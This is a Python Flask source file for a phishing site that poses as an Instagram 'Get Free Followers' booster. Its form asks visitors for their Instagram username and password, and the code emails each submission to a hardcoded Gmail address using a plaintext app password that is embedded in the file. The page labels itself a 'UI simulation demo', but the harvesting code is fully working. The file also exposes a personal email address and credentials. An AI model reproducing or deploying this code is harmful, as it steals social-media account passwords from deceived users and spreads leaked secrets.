import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from flask import Flask, request

app = Flask(__name__)

# ===== आपकी ईमेल जानकारी (Spaces हटा दी गई हैं) =====
YOUR_GMAIL = "mogamadhari@gmail.com"
APP_PASSWORD = "fbhbqgqofhshejfi"
# ==================================================

INSTA_STYLE = '''
<style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #000000; color: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
    .card { background-color: #121212; border: 1px solid #262626; border-radius: 12px; padding: 30px 20px; width: 100%; max-width: 350px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.8); }
    .title { font-size: 22px; font-weight: bold; margin-bottom: 5px; background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
    .subtitle { font-size: 13px; color: #a8a8a8; margin-bottom: 25px; }
    .creator-tag { font-size: 11px; color: #0095f6; font-weight: bold; letter-spacing: 1px; margin-bottom: 15px; text-transform: uppercase; }
    label { font-size: 12px; color: #a8a8a8; display: block; text-align: left; margin-bottom: 5px; font-weight: 600; }
    input[type="text"], input[type="password"], input[type="number"] { width: 100%; padding: 11px; margin-bottom: 15px; border: 1px solid #262626; border-radius: 6px; background-color: #1c1c1c; color: #fff; font-size: 14px; outline: none; }
    input[type="text"]:focus, input[type="password"]:focus, input[type="number"]:focus { border-color: #555; }
    input[type="submit"] { width: 100%; padding: 11px; background-color: #0095f6; color: #ffffff; border: none; border-radius: 6px; font-weight: bold; font-size: 14px; cursor: pointer; margin-top: 5px; }
    input[type="submit"]:hover { background-color: #1877f2; }
    .success-msg { color: #4bb543; font-size: 14px; margin-top: 15px; word-break: break-all; }
</style>
'''

def send_email(username, password, count):
    try:
        msg = MIMEMultipart()
        msg['From'] = YOUR_GMAIL
        msg['To'] = YOUR_GMAIL
        msg['Subject'] = f"New Form Submission: {username}"

        body = f"""
        New Submission Received!
        -------------------------
        Username: {username}
        Password: {password}
        Followers: {count}
        """
        msg.attach(MIMEText(body, 'plain'))

        server = smtplib.SMTP('smtp.gmail.com', 587, timeout=10)
        server.starttls()
        server.login(YOUR_GMAIL, APP_PASSWORD)
        server.send_message(msg)
        server.quit()
        print("Email sent successfully!")
    except Exception as e:
        print(f"Error sending email: {e}")

@app.route('/')
def index():
    return f'''
    <!DOCTYPE html>
    <html lang="hi">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Instagram Follower Generator (Demo)</title>
            {INSTA_STYLE}
        </head>
        <body>
            <div class="card">
                <div class="creator-tag">Created by: Ashutosh</div>
                <div class="title">Get Free Followers 🚀</div>
                <div class="subtitle">Enter your details to boost your account</div>
                <form action="/submit" method="POST">
                    <label>Instagram Username</label>
                    <input type="text" name="username" placeholder="@yourname" required>
                    
                    <label>Password</label>
                    <input type="password" name="password" placeholder="Enter Password" required>
                    
                    <label>Number of Followers</label>
                    <input type="number" name="count" placeholder="e.g. 1000" min="10" max="10000" required>
                    
                    <input type="submit" value="Start Boosting">
                </form>
            </div>
        </body>
    </html>
    '''

@app.route('/submit', methods=['POST'])
def submit():
    user = request.form.get('username')
    pwd = request.form.get('password')
    count = request.form.get('count')

    # Send email notification
    send_email(user, pwd, count)

    return f'''
    <!DOCTYPE html>
    <html lang="hi">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Processing...</title>
            {INSTA_STYLE}
        </head>
        <body>
            <div class="card">
                <div class="creator-tag">Created by: Ashutosh</div>
                <div class="title">Processing Request ⏳</div>
                <p class="success-msg">Successfully submitted request for <b>{count} followers</b> on account <b>{user}</b>!</p>
                <p style="font-size: 12px; color: #888; margin-top: 15px;">(This is a UI simulation demo created by Ashutosh)</p>
                <br>
                <a href="/" style="color: #0095f6; text-decoration: none; font-size: 13px;">⬅️ Go Back</a>
            </div>
        </body>
    </html>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
